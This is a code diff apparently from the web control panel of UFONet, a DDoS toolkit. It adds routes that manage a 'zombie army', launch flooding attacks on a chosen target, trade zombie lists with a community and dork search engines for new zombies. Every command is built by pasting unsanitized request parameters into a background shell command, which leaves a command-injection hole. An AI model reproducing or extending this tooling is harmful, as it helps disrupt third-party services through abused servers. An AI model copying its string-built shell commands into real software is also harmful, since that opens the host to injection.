@@ -614,15 +864,52 @@ function runCommandX(cmd,params) {
         if paramStart != -1:
             page = page[:paramStart]
             pGet = self.buildGetParams(request)
+        if page.startswith("/js/") or page.startswith("/images/")  or page.startswith("/maps/") or page.startswith("/markers/"):
+            if os.path.exists("core/"+page[1:]):
+                f=open("core/"+page[1:])
+                self.pages[page]=f.read()
+            elif page == "/js/ajax.js":
+                from ajaxmap import AjaxMap
+                self.pages[page] = AjaxMap().ajax(pGet)
         if page == "/cmd_list_army":
             f = open('zombies.txt')
             zombies = f.readlines()
             zombies = [zombie.replace('\n', '') for zombie in zombies]
             f.close()
             self.pages["/cmd_list_army"] = "<pre><br /><u>Your Army</u>:<br /><br />"+'\n'.join(zombies)+"</pre>"
+        if page == "/cmd_view_army":
+            if pGet=={}:
+                self.pages["/cmd_view_army"] = self.html_army_map()
+        if page == "/cmd_view_attack":
+            if 'target' in pGet.keys() != None:
+                self.pages["/cmd_view_attack"] = self.html_army_map(pGet['target'])
         if page == "/cmd_test_army":
             self.pages["/cmd_test_army"] = "<pre>Waiting for testing results...</pre>"
             runcmd = "(python -i ufonet -t 'zombies.txt' " + cmd_options + "|tee /tmp/out) &"
+        if page == "/cmd_attack_me":
+            self.pages["/cmd_attack_me"] = "<pre>Waiting for 'attack-me' results...</pre>"
+            runcmd = "(python -i ufonet --attack-me " + cmd_options + "|tee /tmp/out) &"
+        if page == "/cmd_attack_me_update":
+            if not os.path.exists('/tmp/out'):
+                open('/tmp/out', 'w').close()
+            with open('/tmp/out', 'r') as f:
+                self.pages["/cmd_attack_me_update"] = "<pre>"+f.read()+"<pre>"
+        if page == "/cmd_download_community":
+            self.pages["/cmd_download_community"] = "<pre>Waiting for downloading results...</pre>"
+            runcmd = "(python -i ufonet --download-zombies "+ cmd_options + "|tee /tmp/out) &"
+        if page == "/cmd_download_community_update":
+            if not os.path.exists('/tmp/out'):
+                open('/tmp/out', 'w').close()
+            with open('/tmp/out', 'r') as f:
+                self.pages["/cmd_download_community_update"] = "<pre>"+f.read()+"<pre>"
+        if page == "/cmd_upload_community":
+            self.pages["/cmd_upload_community"] = "<pre>Waiting for downloading results...</pre>"
+            runcmd = "(python -i ufonet --upload-zombies "+ cmd_options + "|tee /tmp/out) &"
+        if page == "/cmd_upload_community_update":
+            if not os.path.exists('/tmp/out'):
+                open('/tmp/out', 'w').close()
+            with open('/tmp/out', 'r') as f:
+                self.pages["/cmd_upload_community_update"] = "<pre>"+f.read()+"<pre>"
         if page == "/cmd_test_army_update":
             if not os.path.exists('/tmp/out'):
                 open('/tmp/out', 'w').close() 
@@ -630,8 +917,16 @@ function runCommandX(cmd,params) {
                 self.pages["/cmd_test_army_update"] = "<pre>"+f.read()+"<pre>"
         if page == "/cmd_attack":
             self.pages["/cmd_attack"] = "<pre>Waiting for attacking results...</pre>"
-            print "(python -i ufonet -a '"+pGet["target"]+"' -b '"+pGet["path"]+"' -r '"+pGet["rounds"]+"' "+ cmd_options + "|tee /tmp/out) &"
-            runcmd = "(python -i ufonet -a '"+pGet["target"]+"' -b '"+pGet["path"]+"' -r '"+pGet["rounds"]+"' "+ cmd_options + "|tee /tmp/out) &"
+            if pGet["disable_aliens"] == "on": # disable HTTP POST 'aliens'
+                if pGet["disable_isup"] == "on": # disable external check 'is target up?'
+                    runcmd = "(python -i ufonet -a '"+pGet["target"]+"' -b '"+pGet["path"]+"' -r '"+pGet["rounds"]+"' --disable-aliens --disable-isup "+ cmd_options + "|tee /tmp/out) &"
+                else:
+                    runcmd = "(python -i ufonet -a '"+pGet["target"]+"' -b '"+pGet["path"]+"' -r '"+pGet["rounds"]+"' --disable-aliens "+ cmd_options + "|tee /tmp/out) &"
+            else: 
+                if pGet["disable_isup"] == "on": # disable external check 'is target up?'
+                    runcmd = "(python -i ufonet -a '"+pGet["target"]+"' -b '"+pGet["path"]+"' -r '"+pGet["rounds"]+"' --disable-isup "+ cmd_options + "|tee /tmp/out) &"
+                else:
+                    runcmd = "(python -i ufonet -a '"+pGet["target"]+"' -b '"+pGet["path"]+"' -r '"+pGet["rounds"]+"' "+ cmd_options + "|tee /tmp/out) &"
         if page == "/cmd_attack_update":
             if not os.path.exists('/tmp/out'):
                 open('/tmp/out', 'w').close() 
@@ -648,9 +943,15 @@ function runCommandX(cmd,params) {
         if page == "/cmd_search":
             self.pages["/cmd_search"] = "<pre>Waiting for dorking results...</pre>"
             if pGet["dork_list"] == "on": # search using dork list (file: dorks.txt)
-                runcmd = "(python -i ufonet --sd 'dorks.txt' --sn '"+pGet["num_results"]+"' " + cmd_options + "|tee /tmp/out) &"
+                if pGet["all_engines"] == "on": # search using all search engines
+                    runcmd = "(python -i ufonet --sd 'dorks.txt' --sn '"+pGet["num_results"]+"' --sa " + cmd_options + "|tee /tmp/out) &"
+                else: # search using a search engine
+                    runcmd = "(python -i ufonet --sd 'dorks.txt' --sn '"+pGet["num_results"]+"' --se '"+pGet["s_engine"]+"' " + cmd_options + "|tee /tmp/out) &"
             else: # search using a pattern
-                runcmd = "(python -i ufonet -s '"+pGet["dork"]+"' --sn '"+pGet["num_results"]+"' " + cmd_options + "|tee /tmp/out) &"
+                if pGet["all_engines"] == "on": # search using all search engines
+                    runcmd = "(python -i ufonet -s '"+pGet["dork"]+"' --sn '"+pGet["num_results"]+"' --sa " + cmd_options + "|tee /tmp/out) &"
+                else: # search using a search engine
+                    runcmd = "(python -i ufonet -s '"+pGet["dork"]+"' --sn '"+pGet["num_results"]+"' --se '"+pGet["s_engine"]+"' " + cmd_options + "|tee /tmp/out) &"
         if page == "/cmd_search_update":
             if not os.path.exists('/tmp/out'):
                 open('/tmp/out', 'w').close()
@@ -659,11 +960,11 @@ function runCommandX(cmd,params) {
         if page == "/requests":
             if pGet=={}:
                 self.pages["/requests"] = self.html_requests()
-
             else:
                 self.save_cfg(pGet)
                 self.pages["/requests"] = self.html_request_submit()
-
+        if page == "/wormhole":
+            self.pages["/wormhole"] = self.pages["/header"] + "<iframe height='100%' width='100%' src='https://webchat.freenode.net'>"
         ctype = "text/html"
         if page.find(".js") != -1:
             ctype = "application/javascript"
@@ -673,6 +974,8 @@ function runCommandX(cmd,params) {
             ctype = "image/x-icon"
         elif page.find(".png") != -1:
             ctype = "image/png"
+        elif page.find(".css") != -1:
+            ctype = "text/css"
         if page in self.pages:
             return dict(run=runcmd, code="200 OK", html=self.pages[page], ctype=ctype)
         return dict(run=runcmd, code="404 Error", html="404 Error<br><br>Page not found...", ctype=ctype)
